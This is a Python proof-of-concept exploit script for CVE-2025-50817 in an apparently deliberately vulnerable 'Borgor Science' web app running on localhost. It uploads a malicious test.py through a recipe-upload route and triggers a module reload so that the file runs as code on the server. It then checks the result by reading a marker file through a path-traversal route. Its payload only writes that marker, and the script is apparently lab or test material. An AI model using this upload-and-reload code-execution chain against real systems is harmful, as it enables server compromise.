import requests
import os
import time

# POC for CVE-2025-50817 in the Borgor Science Web App
# Target URL
BASE_URL = "http://localhost:5000"

# 1. Create a malicious test.py
# This file will be imported by future.standard_library in vulnerable version 1.0.0
payload = """
import os
with open('pwned_by_cve_2025_50817.txt', 'w') as f:
    f.write('CVE-2025-50817 Exploit Successful! Code executed.')
print("[!] CVE-2025-50817: Malicious test.py executed!")
"""

with open('test.py', 'w') as f:
    f.write(payload)

print("[+] Created malicious test.py")

# 2. Upload test.py to the vulnerable app via the /upload-recipe route
print("[*] Uploading test.py to /upload-recipe...")
try:
    with open('test.py', 'rb') as f:
        # Note the parameter name change from 'file' to 'recipe'
        files = {'recipe': f}
        response = requests.post(f"{BASE_URL}/upload-recipe", files=files)
        if response.status_code == 200:
            print("[+] Successfully uploaded test.py to kitchen storage")
            time.sleep(1) # Wait for file to be written to disk
        else:
            print(f"[-] Upload failed with status code {response.status_code}")
except Exception as e:
    print(f"[-] Error during upload: {e}")

# 3. Trigger the vulnerability by reloading via /sync-ingredients
print("[*] Triggering CVE-2025-50817 by syncing ingredients...")
try:
    # This route triggers importlib.reload(future.standard_library)
    response = requests.get(f"{BASE_URL}/sync-ingredients")
    print(f"[+] Server response: {response.text}")
except Exception as e:
    print(f"[-] Error during triggering: {e}")

# 4. Verify if the exploit worked (check for pwned_by_cve_2025_50817.txt via /asset-viewer)
print("[*] Verifying exploit...")
try:
    # Using the asset-viewer route which has path traversal
    response = requests.get(f"{BASE_URL}/asset-viewer?path=pwned_by_cve_2025_50817.txt")
    if "CVE-2025-50817 Exploit Successful!" in response.text:
        print("[SUCCESS] Exploit verified! pwned_by_cve_2025_50817.txt was created and read.")
    else:
        print("[-] Exploit verification failed. The file was not created or is not readable.")
except Exception as e:
    print(f"[-] Error during verification: {e}")

# Clean up local file
if os.path.exists('test.py'):
    os.remove('test.py')